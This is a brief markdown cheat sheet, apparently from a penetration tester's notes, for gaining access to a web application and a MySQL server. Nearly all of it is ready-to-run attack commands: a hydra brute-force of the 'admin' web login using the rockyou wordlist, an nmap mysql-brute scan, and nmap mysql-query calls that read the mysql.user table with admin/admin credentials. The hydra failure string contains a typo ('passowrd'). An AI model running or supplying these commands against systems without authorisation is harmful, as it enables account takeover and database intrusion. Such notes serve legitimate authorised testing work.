# Access

[WebApp](#webapp)

[MySQL](#mysql)

## WebApp

**brute-force password for user 'admin' via hydra:**
```
hydra -s <port> -I -l admin -P /usr/share/wordlists/rockyou.txt <ip> http-post-form '/index.php:tg=login&referer=index.php&user=^USER^&password=^PASS^&submit_login=Submit:F=bad+passowrd' -vV
```

## MySQL

**brute-force via nmap:**
```
nmap --script mysql-brute -p 3306 <ip>
```

**fire a query via nmap:**
```
nmap --script mysql-query --script-args "mysql-query.query='SELECT host, user FROM mysql.user', mysql-query.username=admin, mysql-query.password=admin"  -p3306 <ip>

- or -

nmap --script mysql-query --script-args-file $(pwd)/mysql-query-args.txt -p3306 <ip>
```
